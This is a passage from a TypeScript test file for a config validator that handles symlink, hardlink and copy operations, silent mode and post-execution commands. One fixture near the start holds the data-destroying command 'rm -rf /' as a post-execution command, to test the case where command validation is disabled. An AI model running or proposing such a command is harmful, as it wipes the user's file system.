                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'rm -rf /',
                    },
                ],
                fileCountPromptThreshold: 100,
                disableCommandValidation: true,
            };

            // Act & Assert
            await expect(validateConfig(configWithDangerousCommand)).resolves.toBeUndefined();
        });
    });

    describe('Hardlink compatibility validation', () => {
        test('should accept hardlink operation for files', () => {
            // Arrange
            const validOperation = {
                action: 'hardlink',
                itemType: 'file',
            };

            // Act & Assert
            expect(() => validateHardlinkCompatibility(validOperation)).not.toThrow();
        });

        test('should accept symlink operation for directories', () => {
            // Arrange
            const validOperation = {
                action: 'symlink',
                itemType: 'directory',
            };

            // Act & Assert
            expect(() => validateHardlinkCompatibility(validOperation)).not.toThrow();
        });

        test('should accept copy operation for directories', () => {
            // Arrange
            const validOperation = {
                action: 'copy',
                itemType: 'directory',
            };

            // Act & Assert
            expect(() => validateHardlinkCompatibility(validOperation)).not.toThrow();
        });

        test('should reject hardlink operation for directories', () => {
            // Arrange
            const invalidOperation = {
                action: 'hardlink',
                itemType: 'directory',
            };

            // Act & Assert
            expect(() => validateHardlinkCompatibility(invalidOperation)).toThrow(DomainError);
            expect(() => validateHardlinkCompatibility(invalidOperation)).toThrow(
                'Hardlinks are not supported for directories. Use symlink instead.'
            );
        });

        test('should handle null input gracefully', () => {
            // Arrange & Act & Assert
            expect(() => validateHardlinkCompatibility(null)).not.toThrow();
        });

        test('should handle undefined input gracefully', () => {
            // Arrange & Act & Assert
            expect(() => validateHardlinkCompatibility(undefined)).not.toThrow();
        });

        test('should handle non-object input gracefully', () => {
            // Arrange & Act & Assert
            expect(() => validateHardlinkCompatibility('string')).not.toThrow();
            expect(() => validateHardlinkCompatibility(123)).not.toThrow();
            expect(() => validateHardlinkCompatibility(true)).not.toThrow();
        });

        test('should validate hardlink domain error properties', () => {
            // Arrange
            const invalidOperation = {
                action: 'hardlink',
                itemType: 'directory',
            };

            // Act & Assert
            try {
                validateHardlinkCompatibility(invalidOperation);
                fail('Expected DomainError to be thrown');
            } catch (error) {
                expect(error).toBeInstanceOf(DomainError);
                const domainError = error as DomainError;
                expect(domainError.domainErrorInfo.key).toBe(CONFIG_DOMAIN_ERRORS.CONFIG_TYPE.key);
            }
        });
    });

    describe('Silent mode validation', () => {
        test('should allow silent mode with overwrite behavior', async () => {
            // Arrange
            const config: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                silentMode: true,
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(config)).resolves.toBeUndefined();
        });

        test('should allow silent mode with skip behavior', async () => {
            // Arrange
            const config: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                silentMode: true,
                defaultOverwriteBehavior: 'skip',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(config)).resolves.toBeUndefined();
        });

        test('should reject silent mode with error behavior', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                silentMode: true,
                defaultOverwriteBehavior: 'error',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow();
        });

        test('should allow non-silent mode with error behavior', async () => {
            // Arrange
            const config: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                silentMode: false,
                defaultOverwriteBehavior: 'error',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(config)).resolves.toBeUndefined();
        });
    });

    describe('Edge cases and error handling', () => {
        test('should reject null configuration', async () => {
            // Arrange & Act & Assert
            await expect(validateConfig(null)).rejects.toThrow();
        });

        test('should reject undefined configuration', async () => {
            // Arrange & Act & Assert
            await expect(validateConfig(undefined)).rejects.toThrow();
        });

        test('should reject non-object configuration', async () => {
            // Arrange & Act & Assert
            await expect(validateConfig('string')).rejects.toThrow();
            await expect(validateConfig(123)).rejects.toThrow();
            await expect(validateConfig(true)).rejects.toThrow();
        });

        test('should reject configuration with hardlink operations in config', async () => {
            // Arrange
            const configWithHardlinkForDirectory = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'hardlink',
                        itemType: 'directory',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(configWithHardlinkForDirectory)).rejects.toThrow();
        });

        test('should handle complex nested validation errors', async () => {
            // Arrange
            const complexInvalidConfig = {
                targetDirectoryPath: '',
                defaultOverwriteBehavior: 'invalid',
                operations: [
                    {
                        action: 'invalid',
                        itemType: 'invalid',
                        baseDirectoryPath: '',
                        searchPatterns: [],
                    },
                ],
                fileCountPromptThreshold: -1,
                postExecutionCommands: [
                    {
                        command: '',
                        timeoutInMs: -1,
                    },
                ],
            };

            // Act & Assert
            await expect(validateConfig(complexInvalidConfig)).rejects.toThrow();
        });

        test('should validate boolean flag properties', async () => {
            // Arrange
            const configWithFlags: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                silentMode: false,
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
                enableSourceDeduplication: true,
                disableRegexValidation: false,
                disableCommandValidation: false,
            };

            // Act & Assert
            await expect(validateConfig(configWithFlags)).resolves.toBeUndefined();
        });
    });
});
